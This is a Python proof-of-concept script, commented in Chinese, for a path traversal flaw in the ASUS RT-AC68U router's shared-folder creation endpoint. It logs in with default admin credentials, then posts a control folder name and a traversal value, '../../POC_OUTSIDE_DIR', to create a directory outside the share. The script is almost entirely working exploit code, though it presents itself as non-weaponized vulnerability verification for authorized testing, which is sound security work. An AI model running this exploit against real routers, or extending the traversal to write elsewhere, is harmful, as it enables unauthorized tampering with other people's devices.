#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ASUS RT-AC68U 共享文件夹创建接口路径穿越 —— 验证脚本（非武器化，只建目录）

原理：POST /aidisk/create_sharedfolder.asp 的 folder 参数未做路径校验，
libdisk.so::add_folder() 直接 snprintf("%s/%s", mount, folder) 后 mkdir(0777)，
folder 里带 ../ 就会在共享目录之外建目录。

用法：
    TARGET=http://192.168.1.1 POOL=test python3 poc_create_sharedfolder_traversal.py

    # 账号默认 admin；口令从环境变量 PASSWORD 读（未设置时用出厂默认值）
    # 走 Burp 抓包对照（默认开）
    USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080 python3 poc_...

安全声明：仅用于授权测试与漏洞验证，禁止用于未授权系统。脚本只创建两个目录，
不读取、不修改、不删除任何既有文件。
"""
from __future__ import annotations

import base64
import os
import sys

try:
    import requests
except ImportError:  # pragma: no cover
    print("[x] 缺少依赖：pip install requests", file=sys.stderr)
    raise SystemExit(2)

TARGET = os.environ.get("TARGET", "http://192.168.1.1").rstrip("/")
USER = os.environ.get("USERNAME", "admin")
ADMIN_SECRET = os.environ.get("PASSWORD", "admin")
POOL = os.environ.get("POOL", "test")
USE_BURP = os.environ.get("USE_BURP", "1") == "1"
BURP = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")
PROXIES = {"http": BURP, "https": BURP} if USE_BURP else None


def main() -> int:
    if USE_BURP:
        print(f"[i] 走 Burp：{BURP}（USE_BURP=0 可关闭）")

    s = requests.Session()
    s.verify = False
    s.proxies = PROXIES
    try:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    except Exception:  # noqa: BLE001
        pass

    # 1) 登录拿 asus_token
    token = base64.b64encode(f"{USER}:{ADMIN_SECRET}".encode()).decode()
    try:
        r = s.post(f"{TARGET}/login.cgi",
                   data={"login_authorization": token},
                   headers={"Referer": f"{TARGET}/Main_Login.asp"}, timeout=10)
    except requests.RequestException as exc:
        print(f"[x] 连不上 {TARGET}: {exc}", file=sys.stderr)
        return 2

    cookie = r.cookies.get("asus_token") or s.cookies.get("asus_token")
    print(f"[>] POST /login.cgi -> {r.status_code}  asus_token={cookie}")
    if not cookie:
        print("[x] 没拿到 asus_token：账号密码不对，或该页面版本没有这个接口")
        return 2

    # 2) 对照组 + 穿越组
    hdr = {"Referer": f"{TARGET}/aidisk/popCreateFolder.asp"}
    results = {}
    for label, folder in (("对照（共享目录内）", "poc_inside_dir"),
                          ("穿越（共享目录外）", "../../POC_OUTSIDE_DIR")):
        r = s.post(f"{TARGET}/aidisk/create_sharedfolder.asp",
                   data={"account": "", "pool": POOL, "folder": folder},
                   headers=hdr, timeout=10)
        ok = "create_sharedfolder_success" in r.text
        err = "create_sharedfolder_error" in r.text
        results[label] = ok
        print(f"[>] {label}: pool={POOL} folder={folder!r} -> HTTP {r.status_code} "
              f"success={ok} error={err}")

    # 3) 结论
    if results.get("对照（共享目录内）") and results.get("穿越（共享目录外）"):
        print("[+] 漏洞成立：两次都成功，说明 ../ 没被过滤。")
        print(f"[i] 到设备上确认：共享目录之外应出现 POC_OUTSIDE_DIR（drwxrwxrwx）")
        return 0
    if results.get("对照（共享目录内）") and not results.get("穿越（共享目录外）"):
        print("[-] 对照成功、穿越失败：该版本可能已修复，或 pool 名不对。")
        return 1
    print("[-] 对照都没成功：pool 不是已挂载的存储池，或接口/版本不匹配。")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
